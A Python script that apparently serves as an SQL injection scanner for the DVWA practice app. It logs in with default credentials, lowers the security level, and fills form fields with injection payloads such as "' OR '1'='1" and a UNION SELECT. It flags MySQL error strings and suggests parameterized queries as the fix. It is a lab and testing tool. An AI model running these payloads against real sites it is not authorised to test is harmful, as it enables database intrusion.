import requests
from bs4 import BeautifulSoup
import json
import sys
from urllib.parse import urljoin


def load_payloads(file_path='payload.txt'):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] Payload file not found. Using default payloads.")
        return [
            "'",
            "' OR '1'='1",
            "' UNION SELECT null, database() #"
        ]


def login_dvwa(base_url, login_url, username="admin", password="password"):

    session = requests.Session()

    try:
        login_page = session.get(login_url)

        soup = BeautifulSoup(login_page.text, "html.parser")

        token = soup.find("input", {"name": "user_token"})
        token_value = token["value"] if token else None

        login_data = {
            "username": username,
            "password": password,
            "Login": "Login"
        }

        if token_value:
            login_data["user_token"] = token_value

        response = session.post(login_url, data=login_data)

        if response.status_code == 200:
            print("[+] Login Successfully")

            session.cookies.set("security", "low")
            print("[+] Security level forced to LOW")

            return session

        else:
            print("[-] Login Failed")
            return None

    except Exception as e:
        print("Login Error:", e)
        return None


def is_vulnerable(response_text):

    database_errors = [
        "you have an error in your sql syntax",
        "warning mysql",
        "mysqli",
        "mysql_fetch",
        "unknown column",
        "sql syntax",
        "unclosed quotation mark",
        "quoted string not properly terminated"
    ]

    response_lower = response_text.lower()

    for error in database_errors:
        if error in response_lower:
            return True

    return False


def test_form(page_url, form, session, payloads):

    vulnerabilities = []

    action = form.get("action")

    if not action or action == "#":
        action = page_url
    else:
        action = urljoin(page_url, action)

    method = form.get("method", "get").lower()

    inputs = form.get("inputs", [])
    buttons = form.get("buttons", [])

    for payload in payloads:

        for input_field in inputs:

            field_type = input_field.get("type")

            if field_type not in ["text", "password", "hidden"]:
                continue

            name = input_field.get("name")

            if not name:
                continue

            data = {}

            # Fill inputs
            for inp in inputs:

                inp_name = inp.get("name")

                if not inp_name:
                    continue

                if inp_name == name:
                    data[inp_name] = payload
                else:
                    data[inp_name] = inp.get("value") or ""

            for btn in buttons:

                btn_name = btn.get("name")

                if btn_name:
                    data[btn_name] = btn.get("value", "")

            try:

                if method == "post":

                    response = session.post(action, data=data)
                    test_url = action

                else:

                    response = session.get(action, params=data)
                    test_url = response.url

                print("\nTesting:", test_url)
                print("Payload:", payload)

                if is_vulnerable(response.text):

                    vuln = {
                        "page": page_url,
                        "action": action,
                        "method": method,
                        "vulnerable_input": name,
                        "payload": payload,
                        "error": "SQL error detected",
                        "remediation": "Use parameterized queries (prepared statements)"
                    }

                    vulnerabilities.append(vuln)

                    print("[!] Vulnerability Found:", name)

            except requests.RequestException as e:

                print("Request Error:", e)

    return vulnerabilities


def main():

    if len(sys.argv) < 3:

        print("Usage:")
        print("python main.py <base_url> <login_url>")
        sys.exit(1)

    base_url = sys.argv[1]
    login_url = sys.argv[2]

    session = login_dvwa(base_url, login_url)

    if not session:
        sys.exit(1)

    payloads = load_payloads()

    try:

        with open("pages.json", "r") as f:
            data = json.load(f)

    except FileNotFoundError:

        print("pages.json not found")
        sys.exit(1)

    pages = data.get("pages", [])

    all_vulnerabilities = []

    print("\n[+] Starting SQL Injection Scan...\n")

    for page in pages:

        url = page.get("url")

        forms = page.get("forms_on_page", [])

        if "vulnerabilities" not in url:
            continue

        if not forms:
            continue

        print("\nScanning page:", url)

        for form in forms:

            vulns = test_form(url, form, session, payloads)

            all_vulnerabilities.extend(vulns)

    with open("vulnerabilities.json", "w") as f:

        json.dump(all_vulnerabilities, f, indent=4)

    print("\n[+] Scan Complete")
    print("[+] Total vulnerabilities found:", len(all_vulnerabilities))
    print("[+] Results saved to vulnerabilities.json")


if __name__ == "__main__":
    main()